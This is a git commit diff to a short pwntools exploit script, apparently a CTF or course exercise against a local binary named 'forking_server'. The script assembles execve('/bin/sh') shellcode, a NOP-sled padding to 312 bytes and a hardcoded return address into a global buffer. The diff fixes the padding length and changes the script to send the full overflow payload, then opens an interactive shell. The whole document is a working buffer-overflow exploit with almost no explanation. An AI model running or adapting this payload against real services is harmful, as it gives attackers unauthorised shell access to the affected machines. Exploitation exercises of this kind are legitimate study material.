05be587a937e36714c3ecdea87897d30ab99e011
Khalil El Hage Kassem <90007227+Khalil002@users.noreply.github.com>
2025-10-02 00:47:39 +0200

    Update e.py

--- c8/e.py
+++ c8/e.py
@@ -1,17 +1,13 @@
 from pwn import *
 
-def pad_payload(payload: bytes, target_len: int) -> bytes:
-    padding_len = target_len - len(payload)
-    return payload + b"\x90" * padding_len
-
 COMMANDS = """
 xuntil 0x4014a9
 """
 
 shellcode=  b"\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x48\xC7\xC0\x3B\x00\x00\x00\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x0F\x05"
-padding=    b"\x90" * 312
-returnAddr= b"\x68\x0E\x01\x76\xB7\x7C\x00\x00" #This is an example, we need a working return address to the global Buffer
+padding=    b"\x90" * (312-len(shellcode))
 returnAddr= b"\x00\x41\x40\x00\x00\x00\x00\x00"
+
 payload = shellcode+padding+returnAddr
 
 if args.GDB:
@@ -22,7 +18,7 @@ else:
     p = process("./forking_server")
 
 # Send first stage loader (exactly 16 bytes)
-#p.send(shellcode)
+p.send(payload)
 
 p.interactive()
 
